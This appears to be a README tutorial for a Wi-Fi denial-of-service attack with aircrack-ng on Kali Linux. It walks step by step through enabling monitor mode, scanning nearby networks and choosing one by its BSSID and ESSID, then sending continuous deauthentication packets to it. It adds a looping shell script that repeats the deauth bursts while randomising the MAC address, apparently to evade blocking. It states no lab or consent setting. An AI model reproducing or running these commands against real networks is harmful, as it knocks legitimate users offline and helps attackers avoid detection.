# DOS-Attack

---
**What is DOS ATTACK?**

In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet. Denial of service is typically accomplished by flooding the targeted machine or resource with superfluous requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.
For More Depth [Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attack)

---

USING AIRCRACK-NG

```
root@kali:~# ifconfig

```
note down the name of your wireless interface
here **wlan0** is used and create a .sh file (use your favourite text editor)
```
root@kali:~#vi monitor.sh

(for using vim editor type)

insert
type whatever content u want to whatever
esc
:wq)

```
[For More Vim Command](https://www.tutorialspoint.com/vim/vim_editing.htm)

*And type the following command*

```
#!/bin/bash

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0 | grep Mode

```

In Another tab:

```
root@kali:~# chmod +x monitor.sh
root@kali:~# ./monitor.sh

(some expected output)

wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.462 GHz  Tx-Power=20 dBm

root@kali:~#airodump-ng wlan0

(scanning)

some expected output

CH 10 ][ Elapsed: 1 min ][ 2020-05-01 06:41 ][ interface wlan0 down                                                                                                                                             

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                 

 BE:2A:16:CC:C4:C0  -31      100        0    0  11  180   WPA2 CCMP   PSK  ABHIJIT                                                                                                                               
 BE:2F:3D:31:8A:CC  -24      151        0    0   1   65   WPA2 CCMP   PSK  vivo 1609                                                                                                                             
 C4:E9:0A:E3:5D:3C  -62      179        0    0   6  270   WPA2 CCMP   PSK   AUTO CENTER

 ```

Note down the channel no. and BSSID of the router you want to attack here we are attacking ESSID "ABHIJIT"
channel=11
**BBSID=BE:2A:16:CC:C4:C0**

```
root@kali:~# iwconfig channel 11

(switching to the required channel)

root@kali:~# aireplay-ng -0 0 -a BE:2A:16:CC:C4:C0 wlan0 -e ABHIJIT

```

('-0' is used for deauthentication the next number denotes the number the deauthentication packets to be sent if it is 0 it will send continuously untill stopped manually)

#####EXTRA TIPS (IFF not using virtual systems)

creating a .sh which will continuously send some deauthentication packets and then change the mac address of the system , sleeping for some seconds and then the process carries on

```
root@kali:~# vi dos.sh

#!/bin/bash


while true
do
        iwconfig wlan0 channel $1
        aireplay-ng -0 5 -a $2 wlan0
        ifconfig wlan0 down
        macchanger -r eth0 | grep "New MAC"
        ifconfig wlan0 up
        sleep 3

done

```
**In different Tab**

```
root@kali:~#chmod +x dos.sh

root@kali:~#./dos.sh 11 BE:2A:16:CC:C4:C0

```

(dynamic value is used in the dos.sh, 11 goes to $1 , BE:2A:16:CC:C4:C0 goes to $2)


**NOTE**
>after the process the wireless interface can show trouble so run the below code or  reboot your system
```
root@kali:~#service network-manager restart

```
[ALL CODES](https://github.com/kaki-epithesi/dos-attack)
